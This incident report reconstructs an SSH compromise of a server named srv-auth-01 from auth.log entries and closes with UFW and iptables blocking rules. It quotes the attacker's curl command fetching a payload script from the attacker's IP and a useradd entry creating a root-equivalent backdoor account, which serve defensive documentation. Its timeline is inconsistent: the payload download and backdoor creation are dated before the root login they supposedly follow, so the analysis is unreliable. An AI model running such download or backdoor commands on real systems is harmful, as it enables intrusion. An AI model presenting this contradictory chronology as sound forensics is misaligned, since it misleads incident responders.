# Incident Report: Unauthorized Access and Persistence on `srv-auth-01`

## Executive Summary
An incident investigation of `auth.log` revealed that `srv-auth-01` was targeted by external brute-force attacks (`203.0.113.0/24` range and `198.51.100.77`). The attacker successfully compromised root access via SSH (`198.51.100.77`), downloaded a malicious payload (`http://198.51.100.77/x.sh`), and established persistence by creating a backdoor privileged user (`svc-backup`).

---

## Evidence & Timeline

1. **Brute-Force Activity:** Continuous failed password attempts for invalid users (`oracle`, `test`, `admin`, `pi`) originating from `203.0.113.x`.
2. **Targeted Root Compromise:**
   - **01:05:57 - 01:09:14:** Repeated failed password attempts for `root` from IP `198.51.100.77`.
   - **01:12:00:** Successful password authentication for `root` from IP `198.51.100.77` (`Accepted password for root from 198.51.100.77 port 41031 ssh2`).
3. **Post-Exploitation / Payload Download:**
   - **01:07:36:** `sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.77/x.sh -o /tmp/.x`
4. **Persistence:**
   - **01:10:46:** `useradd[7120]: new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash`

---

## Attacker Profile
- **IP Address:** `198.51.100.77`
- **Associated Activity:** SSH brute-forcing against `root`, successful credential compromise, payload retrieval via `curl`, and creation of a UID 0 backdoor account.
- **Supporting Infrastructure:** `203.0.113.0/24` (suspected distributed scanning/brute-force botnet).

---

## Post-Exploitation Summary
- **Payload Dropped:** `/tmp/.x` via `curl` from `http://198.51.100.77/x.sh`.
- **Privilege Escalation / Backdoor:** Creation of user `svc-backup` with `UID=0` and `GID=0` (effectively a root-equivalent backdoor account).

---

## Recommended Firewall & Mitigation Commands (UFW / iptables)

To isolate the attacker and block further access from the malicious IPs, execute the following commands on the affected host:

```bash
# Block the primary attacker IP
sudo ufw deny from 198.51.100.77 to any port 22 proto tcp
sudo iptables -A INPUT -s 198.51.100.77 -p tcp --dport 22 -j DROP

# Block the brute-force subnet
sudo ufw deny from 203.0.113.0/24 to any port 22 proto tcp
sudo iptables -A INPUT -s 203.0.113.0/24 -p tcp --dport 22 -j DROP
```
